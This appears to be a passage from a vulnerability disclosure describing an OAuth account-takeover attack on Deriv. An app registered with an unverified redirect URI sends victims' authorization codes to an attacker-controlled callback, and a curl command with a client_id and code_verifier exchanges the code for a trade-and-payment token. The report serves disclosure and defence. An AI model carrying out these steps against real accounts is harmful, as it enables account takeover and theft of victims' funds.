What happens next (per Deriv's own OAuth docs), if fired

  1. Victim clicks the button, arrives on the real auth.deriv.com login/consent screen.
  2. If not already logged in, they log in with their real Deriv credentials — directly to Deriv, nothing is intercepted here.
  3. They see a consent screen for "ATO_PoC_test_app" (an attacker could rename this to anything, e.g. "Deriv Copy Trading Pro") requesting Trade, Payment, and Account management access, and click Allow.
  4. Deriv redirects the browser to: 
    https://attacker-controlled.example/callback?code=<AUTH_CODE>&state=IZsubfMsKpzKLuSJa0nCqJaRMShlzbrZ
    — landing the authorization code on attacker-controlled infrastructure.
  5. The attacker (who generated and privately kept the matching code_verifier) exchanges the code server-to-server: 
    curl -X POST https://auth.deriv.com/oauth2/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code" \
  -d "client_id=01a06da7-5ee7-7784-ace8-1851107b7111" \
  -d "code=<AUTH_CODE_FROM_CALLBACK>" \
  -d "code_verifier=zNJzRbJlRW7xTvFocIaCi8jGZyBpag3kpnMJD4HtMsbCp1BdC4OciqEo0LyysN9D3wvEtPc7JnsbDAr7t0Qo3g" \
  -d "redirect_uri=https://attacker-controlled.example/callback"
    and receives a live Bearer access_token scoped to trade + payment + account_manage on the victim's real account — usable directly against api.derivws.com. Full account takeover with fund-movement capability. The victim's password was never touched or known by the attacker.

Root cause

POST /devhub/v1/apps on api-core.deriv.com accepts any redirect_uris value — including bare external domains, wildcard subdomains, and plain HTTP — with no domain-ownership verification, and immediately sets the app to state: "active" with no review. The schema has a domain_verification_challenge field that is never populated, strongly suggesting this control was intended but isn't wired up.
